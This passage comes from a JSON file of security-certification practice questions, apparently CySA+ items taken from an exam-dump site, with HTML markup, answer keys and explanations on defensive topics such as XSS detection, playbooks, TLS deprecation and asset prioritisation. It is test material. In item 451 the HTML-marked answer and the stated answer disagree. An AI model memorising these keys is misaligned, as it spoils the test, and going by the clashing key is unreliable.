ned</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>The vulnerable parameter ID and unfiltered or encoded characters passed &gt; and \" as unsafe</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>The vulnerable parameter ID with a SQL Injection attempt</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The Nmap script http-unsafe-output-escaping checks whether special characters are reflected back without proper output encoding, which can indicate an XSS vulnerability.\n\nHere:\n\nCharacters [> \" '] reflected in parameter id\n\nSo it identifies:\n\nParameter: id\nProblem: Characters are reflected unfiltered\nPotential issue: XSS\n\n🧠 Remember:\nReflected special characters → possible XSS → B"},{"number":442,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">The SOC team reestablishes user access after a threat actor successfully performed a business account compromise in which the attacker revoked the legitimate user's access. The following logs are provided to a SOC analyst:<br><br><img src=\"https://img.examtopics.com/cs0-003/image98.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following did the threat actor most likely use during the compromise?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Brute-force password attack</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>A valid, leaked credential</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Command-and-control traffic</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Introduction of a new account</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The attacker used valid credentials, removed MFA, changed the password, and blocked the legitimate user."},{"number":443,"content":"<!--StartFragment--><p class=\"card-text\" style=\"box-sizing: border-box; margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;\">A security analyst has just received an incident ticket regarding a ransomware attack. Which of the following would most likely help an analyst properly triage the ticket?</p><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><!--StartFragment--><!--EndFragment--></p><div class=\"question-choices-container\" style=\"box-sizing: border-box; margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;\"><ul style=\"box-sizing: border-box; margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"box-sizing: border-box; padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\" style=\"box-sizing: border-box;\">A.<span>&nbsp;</span></span>Incident response plan</li><li class=\"multi-choice-item\" style=\"box-sizing: border-box; padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\" style=\"box-sizing: border-box;\">B.<span>&nbsp;</span></span>Lessons learned</li><li class=\"multi-choice-item correct-hidden\" style=\"box-sizing: border-box; padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\" style=\"box-sizing: border-box;\">C.<span>&nbsp;</span></span>Playbook</li><li class=\"multi-choice-item\" style=\"box-sizing: border-box; padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\" style=\"box-sizing: border-box;\">D.<span>&nbsp;</span></span>Tabletop exercise</li></ul></div><!--EndFragment-->","correct":"C","explanation":"Playbooks are tactical, step-by-step guides specifically designed for particular incident types (e.g., ransomware). They provide immediate, actionable procedures for triage: initial assessment, classification of severity, containment steps (like isolating affected systems), evidence collection, notification thresholds, and escalation paths. This enables fast, consistent decision-making during time-sensitive events like ransomware, where rapid triage can limit encryption spread and data loss."},{"number":444,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is the best authentication method to secure access to sensitive data?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>An assigned device that generates a randomized code for log-in</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Biometrics and a device with a personalized code for log-in</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Alphanumeric/special character username and passphrase for log-in</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>A one-time code received by email and push authorization for log-in</li></ul></div><!--EndFragment-->","correct":"B","explanation":"For sensitive data, the strongest choice is \nbiometrics combined with a personalized device code because it uses two distinct authentication factors, which is more resistant to single-factor compromise."},{"number":445,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A security analyst runs the following command:<br><br><img src=\"https://img.examtopics.com/cs0-003/image100.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following should the analyst recommend first to harden the system?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Disable all protocols that do not use encryption.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Configure client certificates for domain services.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Ensure that this system is behind a NGFW.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Deploy a publicly trusted root CA for secure websites.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"23/tcp open telnet — Telnet is a plaintext protocol that transmits data (including credentials) in clear text, making it highly vulnerable to eavesdropping, man-in-the-middle (MITM) attacks, credential sniffing, and replay attacks. This is a classic insecure service that should never be exposed, especially on an internal or perimeter-facing system."},{"number":446,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following is best suited for determining the methods of an adversary?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>ОWASP</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Cyber Kill Chain</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>MITRE ATT&amp;CK</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Diamond Model of Intrusion Analysis</li></ul></div><!--EndFragment-->","correct":"C","explanation":"MITRE ATT&CK maps how attackers operate, including their tactics and techniques (TTPs).\nThink: ATT&CK = adversary methods."},{"number":447,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">An organization adds an MSSP to supplement its security monitoring operations during weekends and holidays. Which of the following would best demonstrate procurement value to the Chief Information Security Officer?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Stakeholder validation metrics</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Mean time to respond</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Alert volume</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Number of escalations per week</li></ul></div><!--EndFragment-->","correct":"B","explanation":"MTTR shows the CISO whether the MSSP is actually improving incident response speed during weekends and holidays.\nThink: MSSP value = faster response."},{"number":448,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following explains the reason a security analyst would map an attack route?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>To find critical paths that can be used to stop an adversary from advancing</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>To create an inventory of all IT assets to import into a database</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>To operationalize intelligence gathered from a previous step in the investigation</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>To categorize the tactics according to the MITRE ATT&amp;CK framework</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Attack-route mapping shows how an attacker can move through an environment, helping analysts identify points where they can block or disrupt the attack.\n\nAttack-route mapping helps identify where an adversary can move, so \nanalysts can place controls at critical points to stop further progress."},{"number":449,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">The most recent vulnerability scan results show the following:<br><br><img src=\"https://img.examtopics.com/cs0-003/image101.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>The vulnerability team learned the following from the asset owners:<br><br>• Server HQFIN01 is a financial transaction database server used in the company's largest business unit.<br>• Server HQADMIN02 is utilized by an end user with administrator privileges to several critical applications.<br>• No compensating controls exist for either issue.<br><br>Which of the following would the vulnerability team most likely do to determine remediation prioritization?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Review the BCP and prioritize the remediation of the asset that would take more time to bring online for operational use.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Contact the network and desktop engineering teams to discuss prioritizing the asset that is faster to remediate.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Reference the BIA to determine the value designation and prioritize vulnerability remediation of the more critical asset.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Identify the network placement and configuration of each asset, then prioritize the asset with the least recent backups.</li></ul></div><!--EndFragment-->","correct":"C","explanation":"A Business Impact Analysis (BIA) helps determine the criticality of assets based on their role in business operations.\nSince HQFIN01 supports financial transactions in the company’s largest business unit, it likely has a higher business impact than HQADMIN02.\nPrioritizing based on business value and operational impact ensures the most critical systems are protected first."},{"number":450,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A company’s policy is to follow NIST standards and use strong encryption to avoid disclosure of sensitive information in transit between any systems. An analyst reviews a lab web server and receives the following outputs:<br><br><img src=\"https://img.examtopics.com/cs0-003/image102.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>Which of the following should the analyst identify as the most concerning?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>TLS 1.0 is enabled.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>The certificate is self-signed.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>SSLv3 is disabled.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>TLS 1.3 is not widely supported.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"E\">E.&nbsp;</span>TLS compression is disabled.</li></ul></div><!--EndFragment-->","correct":"A","explanation":"TLS 1.0 and 1.1 are deprecated by NIST and major standards bodies due to known vulnerabilities and lack of support for modern cryptographic algorithms.\nTheir presence violates NIST SP 800-52 Rev. 2, which mandates the use of TLS 1.2 or higher for secure communications.\nKeeping these protocols enabled increases the risk of downgrade attacks and weak cipher usage."},{"number":451,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">The Chief Information Security Officer wants the same level of security to be present whether a remote worker logs in at home or at a coffee shop. Which of the following should be recommended as a starting point?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Non-persistent virtual desktop infrastructures</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Passwordless authentication</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Standard-issue laptops</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Serverless workloads</li></ul></div><!--EndFragment-->","correct":"C","explanation":"Standard-issue laptops provide a consistent, centrally managed security configuration regardless of where the employee connects.\n\n🧠 Think: Same device + same security controls → consistent protection.\n\nStandard-issue laptops provide consistent baseline controls across locations, while \npasswordless authentication mainly strengthens identity security rather than the device’s overall configuration."},{"number":452,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A report contains IoC and TTP information for a zero-day exploit that leverages vulnerabilities in a specific version of a web application. Which of the following actions should a SOC analyst take first after receiving the report?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Implement a vulnerability scan to determine whether the environment is at risk.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Block the IP addresses and domains from the report in the web proxy and firewalls.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Verify whether the information is relevant to the organization.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Analyze the web application logs to identify any suspicious or malicious activity.</li></ul></div><!--EndFragment-->","correct":"C","explanation":"The analyst should first determine if the organization uses the affected web application/version before taking action.\n\n🧠 Think: Validate relevance → then investigate/contain.\n\nThe first step is to confirm the report applies to the environment, \nthen investigate affected systems for signs of exploitation, because containment is most effective after relevance is established."},{"number":453,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">After updating the email client to the latest patch, only about 15% of the workforce is able to use email. Windows 10 users do not experience issues, but Windows 11 users have constant issues. Which of the following did the change management team fail to do?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Implementation</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Testing</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Rollback</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Validation</li></ul></div><!--EndFragment-->","correct":"B","explanation":"The team failed to test the email client update across different environments, especially Windows 11, before deploying it widely."},{"number":454,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following does a security policy do?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Establishes a cost model for security activity</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Identifies and clarifies security goals and objectives</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Enables management to define system access rules</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Allows management to define system recovery requirements</li></ul></div><!--EndFragment-->","correct":"B","explanation":"A security policy defines the organization's overall security goals, objectives, and expectations."},{"number":455,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A vulnerability scan shows the following vulnerabilities in the environment:<br><br><img src=\"https://img.examtopics.com/cs0-003/image103.png\" style=\"vertical-align: middle; border-style: none;\"><br><br>At the same time, the following security advisory was released:<br><br>\"A zero-day vulnerability with a CVSS score of 10 may be affecting your web server. The vendor is working on a patch or workaround.\"<br><br>Which of the following actions should the security analyst take first?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Contact the web systems administrator and request that they shut down the asset.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Monitor the patch releases for all items and escalate patching to the appropriate team.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Run the vulnerability scan again to verify the presence of the critical finding and the zero-day vulnerability in the environment.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Forward the advisory to the web security team and initiate the prioritization strategy for the other vulnerabilities.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"The zero-day (CVSS 10) needs immediate attention, but you should notify the appropriate team and prioritize the risks rather than immediately shutting down the server.\n\n🧠 Think: Zero-day → notify + prioritize → mitigate."},{"number":456,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following threat-hunting concepts is most concerned with identifying the behaviors of the bad actor?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Threat intelligence sharing</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Indicators of compromise</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Insider threat analysis</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Tactics, techniques, and procedures</li></ul></div><!--EndFragment-->","correct":"D","explanation":"TTPs describe the behaviors and methods used by attackers."},{"number":457,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Which of the following best explains the importance of playbooks for incident response teams?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Playbooks define compliance controls and help keep the monitoring process that is in place fully aligned with regulatory requirements as designed by international rules.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Playbooks help implement mitigation controls to prevent the occurrence of incidents in accordance with internal policies and procedures as designed by the IT team.</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Playbooks set baseline requirements that are implemented before incidents happen to ensure the proper monitoring process in order to collect metrics and KPIs that will be used for lessons-learned procedures after a postmortem analysis.</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>Playbooks help minimize negative impacts and restore data, systems, and operations through highly detailed, preplanned procedures that will be followed when particular types of incidents occur.</li></ul></div><!--EndFragment-->","correct":"D","explanation":"Playbooks provide detailed, step-by-step procedures for responding to specific incidents, helping teams reduce impact and restore systems quickly.\n\n🧠 Think: Playbook = “What do we do when this incident happens?”\n\nPlaybooks reduce incident impact by standardizing response actions, and \ntheir value is greatest when procedures are specific enough to guide containment, eradication, and recovery."},{"number":458,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">Alerts from the security dashboard are reporting a cloud-based host is suspected to be corrupt. The OS is not loading. The initial investigation concludes that the OS files were modified. Which of the following security controls provided the report?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>FIM</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>DLP</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>NIDS</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"D\">D.&nbsp;</span>API gateway</li></ul></div><!--EndFragment-->","correct":"A","explanation":"Pay attention to this phrase: The initial investigation concludes that the OS files were modified. File Integrity Monitoring"},{"number":459,"content":"<!--StartFragment--><p class=\"card-text\" style=\"margin: 0px 0px 26px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\">A company received a shipment of new network switches. Immediately after installing the switches, a security analyst notices suspicious traffic coming from one of the new switches. Which of the following best describes the threat actor?</p><div class=\"question-choices-container\" style=\"margin: 8px 0px 20px; color: rgb(80, 80, 80); font-family: &quot;Roboto Condensed&quot;, sans-serif; font-size: 16px;\"><ul style=\"margin: 0px; list-style: outside none none; padding: 0px;\"><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"A\">A.&nbsp;</span>Insider threat</li><li class=\"multi-choice-item correct-hidden\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"B\">B.&nbsp;</span>Supply chain</li><li class=\"multi-choice-item\" style=\"padding: 4px 0px 4px 25px;\"><span class=\"multi-choice-letter\" data-choice-letter=\"C\">C.&nbsp;</span>Nation-state</li><li 